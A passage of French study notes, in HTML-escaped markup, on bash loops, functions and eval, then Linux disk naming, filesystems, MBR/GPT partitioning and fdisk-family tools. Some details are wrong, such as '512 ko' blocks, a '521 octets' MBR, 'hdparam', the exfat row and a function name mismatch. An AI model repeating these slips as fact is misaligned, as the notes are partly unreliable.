  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;int: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$int&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$int&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 10 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;int vaut 10 !!&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# suite apres le premier donne rencontré&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# continue # passe boucle suivante, peut prendre arg&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;fi
done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;while&quot;&gt;while&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;debut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
&lt;span class=&quot;nb&quot;&gt;typeset&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; debut
&lt;span class=&quot;nv&quot;&gt;fin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$debut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$fin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;les valeurs ne sont pas egales&quot;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;eval &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debut&lt;/span&gt;+1
&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Saisisez une commande (&amp;gt; fin pour quitter)&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# ou while :&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;rep
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rep&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;fin&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;break
    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;until&quot;&gt;until&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$debut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$fin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;les valeurs ne sont pas&quot;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;eval &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debut&lt;/span&gt;+1
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;select&quot;&gt;select&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;PS3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Votre réponse &amp;gt; &quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;elt &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Bonjour Salut Yolo
&lt;span class=&quot;k&quot;&gt;do
  case&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$elt&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Bonjour&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Vous avez choisie Bonjour&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Salut&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Vous avez choisie Salut&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;Yolo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Vous avez choisie Yolo&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;functions&quot;&gt;functions&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;my_fonction&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Je suis dans la fonction de &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$prenom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;0
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;prenom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mourad
&lt;span class=&quot;nv&quot;&gt;nom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;allam
ma_fonction &lt;span class=&quot;nv&quot;&gt;$prenom&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$nom&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; mon_fichier.sh

my_function

&lt;span class=&quot;nv&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10
&lt;span class=&quot;c&quot;&gt;# expr prend que des nombres&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;expr &lt;/span&gt;2 + 3
&lt;span class=&quot;nb&quot;&gt;expr&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; + 3
&lt;span class=&quot;nb&quot;&gt;expr&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; 3
&lt;span class=&quot;nv&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$((&lt;/span&gt;a &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3/6&quot;&lt;/span&gt; | bc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;20
&lt;span class=&quot;nb&quot;&gt;eval echo&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;

signal_recu &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'je viens de recevoir un signal'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'signal_recu'&lt;/span&gt; SIGINT

&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;10

&lt;span class=&quot;nv&quot;&gt;old_IFS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IFS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;:
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Please input some data separated by colons ...&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;x y z
&lt;span class=&quot;nv&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$old_IFS&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;x is &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; y is &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$y&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; z is &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$z&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;
&lt;hr /&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;i---répresentation-des-disques&quot;&gt;I - Répresentation des disques&lt;/h1&gt;
&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;disques dans /dev&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;controleur-ide-ancien&quot;&gt;controleur IDE (ancien)&lt;/h3&gt;
&lt;p&gt;en hdX
hda, hdb, hdc,…&lt;/p&gt;

&lt;p&gt;port extension machine = slot PCI
hdX n’existe plus sur dernière version du noyau&lt;/p&gt;

&lt;h3 id=&quot;controleur-scsi-sata-usb&quot;&gt;controleur SCSI, SATA, USB,…&lt;/h3&gt;
&lt;p&gt;sdX
sda, sdb, sdc,…
nom suivant ordre detection
CD, DVD, Blueray: srX, sr0, sr1, sr2
aussi en scd0 mais pointe vers sr0&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# affiche périphérique SCSI&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsscsi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;controleur-spécifique&quot;&gt;controleur spécifique&lt;/h3&gt;
&lt;p&gt;cXdYpZ
X: slot
Y: disque
Z: partition&lt;/p&gt;

&lt;h3 id=&quot;virtualisation&quot;&gt;virtualisation&lt;/h3&gt;
&lt;p&gt;vitual disk
Ex:vda, vdb ou xvda, xvdb&lt;/p&gt;

&lt;h1 id=&quot;manipulation-de-bas-niveau&quot;&gt;Manipulation de bas niveau&lt;/h1&gt;
&lt;p&gt;disqueq géré par bibliothéque libata, on peut faire des modifs (p271)&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# SATA, ATA (IDE), SAS&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdparam
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdparam &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; /dev/sda &lt;span class=&quot;c&quot;&gt;# info depuis noyau&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdparam &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; /dev/sda &lt;span class=&quot;c&quot;&gt;# info depuis disque&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# SCSI&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sdparam
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;système-de-fichier&quot;&gt;Système de fichier&lt;/h1&gt;
&lt;p&gt;on organise le support d’une certaine manière afin de pourvoir y stocker des données
associer nom fichier à son contenu + meta-data
255 caractères max
extension inutile != Windows
type fichier determiné par le premier octet (type MIME)&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# utilise type MIME&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;mon_fichier
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;journalisation&quot;&gt;Journalisation&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;garantir intégrité données&lt;/li&gt;
  &lt;li&gt;le FS maintient un journal dans lequel il trace tous les changements intervenus avant de les effectuer réellement et de les pointer une fois terminés&lt;/li&gt;
  &lt;li&gt;en cas de coupure, relit journal et rejoue opération si nécessaire&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;file system&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;caractéristiques&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ext2&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FS historique, non journalisé, rapide, nécessite moins décritures&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ext3&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ext2 + journal, passage ext2 &amp;lt;-&amp;gt; ext3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ext4&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;compatible ext3, meilleur allocation, vitesse de vérification rapide&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;btrfs&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;à terme nouveau FS de Linux, concurant à xfs, modif volumes à chaud, proche de LVM&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reiserfs&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;1er FS journalisé, performant sur petits fichiers&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;xfs&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;journalisation très performante, Red Hat, snapshot, modif volume à chaud&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;vfat&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;toute version de FAT, pour petits volumes, simple, cross-platforme&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exfat&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;défaut, pas de notion de droits, fichier max 4Go, remplacé par NTFS&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exfat&lt;/code&gt;: version amélioré de &lt;code class=&quot;highlighter-rouge&quot;&gt;vfat&lt;/code&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;NTFS&lt;/code&gt;: pour partager Linux-Windows
&lt;code class=&quot;highlighter-rouge&quot;&gt;VFAT&lt;/code&gt;: bcp de problèmes de brevets&lt;/p&gt;

&lt;h1 id=&quot;partionnement&quot;&gt;Partionnement&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;découpage logique du disque, le disque physique, réel, est fractionné en plusieurs disques virtuels, logique, les partitions&lt;/li&gt;
  &lt;li&gt;chaque partion est vue comme un disque indépendant avec son propre FS&lt;/li&gt;
  &lt;li&gt;2 méthodes de partionnements:
    &lt;ul&gt;
      &lt;li&gt;MBR: machines BIOS&lt;/li&gt;
      &lt;li&gt;GPT: machine UEFI (+BIOS)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;mbr&quot;&gt;MBR&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;position sur 32 bits&lt;/li&gt;
  &lt;li&gt;1 block = 512 ko&lt;/li&gt;
  &lt;li&gt;2 To max de partition&lt;/li&gt;
  &lt;li&gt;le * utilisé mais bascule vers GPT car UEFI&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;MBR - 521 octets
gestionnaire d’amorcage (446 o) | tables des 4 partitions primaires (64 o) | signature (2 o)&lt;/p&gt;

&lt;h3 id=&quot;partition&quot;&gt;partition&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;partitions primaires (4 dans MBR)&lt;/li&gt;
  &lt;li&gt;partition primaire étendue (1 dans MBR)&lt;/li&gt;
  &lt;li&gt;partitions logiques&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;disques IDE: 63 partitions max par disque
disque SCSI: 15 partitions max par disque
partition de 1 à n
n &amp;gt;= 5: partitions logiques
la partition primaire 4 (la dernière) est souvent primaire
1 à 3: primaire
4: étendu
5 à n: logique
&lt;code class=&quot;highlighter-rouge&quot;&gt;hda1&lt;/code&gt;: disque IDE 1, 1ére partition primaire
&lt;code class=&quot;highlighter-rouge&quot;&gt;hdb5&lt;/code&gt;: disque IDE 2, 5ére partition primaire&lt;/p&gt;

&lt;h3 id=&quot;ebr&quot;&gt;EBR&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;chaque partition étendue doit décrire les partitions logiques qu’elle contient&lt;/li&gt;
  &lt;li&gt;doit disposer d’une table des paritions&lt;/li&gt;
  &lt;li&gt;possède 2 enregistrements: 1er: position et taille d’une partition logique
2éme: vide si pas d’autre partition logique, sinon pointe sur autre EBR (liste chainée)&lt;/li&gt;
  &lt;li&gt;1 EBR = 1 partition décrite&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;pbr-ou-vbr&quot;&gt;PBR ou VBR&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;1er secteur de chaque partition primaire ou logique&lt;/li&gt;
  &lt;li&gt;peut contenir routine ou chargeur d’amorcage si vocation à petre booté&lt;/li&gt;
  &lt;li&gt;quand pas de routine dans MBR, bios cherche dans PBR&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;type-de-partition&quot;&gt;type de partition&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;en hexa sur 1 octet&lt;/li&gt;
  &lt;li&gt;respecter type partition/système de fichier&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;partionnement-gpt&quot;&gt;Partionnement GPT&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;UEFI remplace BIOS&lt;/li&gt;
  &lt;li&gt;GPT remplace MBR&lt;/li&gt;
  &lt;li&gt;adressage sur 64 bits&lt;/li&gt;
  &lt;li&gt;bloc d’au moins 512 octets&lt;/li&gt;
  &lt;li&gt;plus de notion de bloc mais de LBA&lt;/li&gt;
  &lt;li&gt;LBA : Logical Block Addressing&lt;/li&gt;
  &lt;li&gt;LBA 0: 512 premiers octets&lt;/li&gt;
  &lt;li&gt;LBA 1: les 512 suivants&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;guid&quot;&gt;GUID&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Global Unique Identifier&lt;/li&gt;
  &lt;li&gt;unique 128 bits, ID de composant&lt;/li&gt;
  &lt;li&gt;dans GPT, décrit, disque, id de type de partition, id d’une partition&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;lba-0&quot;&gt;LBA 0&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;conserver rôle de MBR&lt;/li&gt;
  &lt;li&gt;protectiver MBR, permet de reconnaitre disque GPT&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;lba-1-lba--1&quot;&gt;LBA 1 (LBA -1)&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;en-tête GPT
    &lt;ul&gt;
      &lt;li&gt;emplacement et taille du LBA -1&lt;/li&gt;
      &lt;li&gt;sommes de contrôles associées&lt;/li&gt;
      &lt;li&gt;1ére et derniére adresse utilisable pour partition&lt;/li&gt;
      &lt;li&gt;le GUID du disque&lt;/li&gt;
      &lt;li&gt;adresse table de partition (LBA 2)&lt;/li&gt;
      &lt;li&gt;nb et taille des descripteurs de partitions&lt;/li&gt;
      &lt;li&gt;somme de contrôle de la table des partitions&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;lba-2-à-33&quot;&gt;LBA 2 à 33&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;descripteurs de partition (128 octets)&lt;/li&gt;
  &lt;li&gt;4 partitions par LBA&lt;/li&gt;
  &lt;li&gt;32 LBA -&amp;gt; 128 partitions max&lt;/li&gt;
  &lt;li&gt;peut être modifié dans LBA 1&lt;/li&gt;
  &lt;li&gt;sauvegarde en LBA -2 à -33&lt;/li&gt;
  &lt;li&gt;descripteur de partition
    &lt;ul&gt;
      &lt;li&gt;type GUID de la partition&lt;/li&gt;
      &lt;li&gt;GUID de la part.&lt;/li&gt;
      &lt;li&gt;LBA de début de la part&lt;/li&gt;
      &lt;li&gt;LBA de fin de la partition&lt;/li&gt;
      &lt;li&gt;attributs de la partition&lt;/li&gt;
      &lt;li&gt;son nom&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;manipulation-des-partitions&quot;&gt;Manipulation des partitions&lt;/h1&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# le plus ancien, le plus utilisé (menu), pour MBR&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fdisk

&lt;span class=&quot;c&quot;&gt;# dérivé de fdisk&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cfdisk

&lt;span class=&quot;c&quot;&gt;# compliqué mais précis&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sfdisk

&lt;span class=&quot;c&quot;&gt;# opérations avancées, scriptable&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;parted

&lt;span class=&quot;c&quot;&gt;# equivalent fdisk pour GPT&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdisk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;manipulation-partition-mbr&quot;&gt;manipulation partition MBR&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fdisk &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fdisk &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /dev/sda

&lt;span class=&quot;c&quot;&gt;# &quot;p&quot; pour print les partions&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;d&quot; supprimer partition&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;n&quot; créer partition&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# &quot;p&quot; ou &quot;e&quot;, primary ou extended&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# choisir début de la partition&lt;/span&gt;
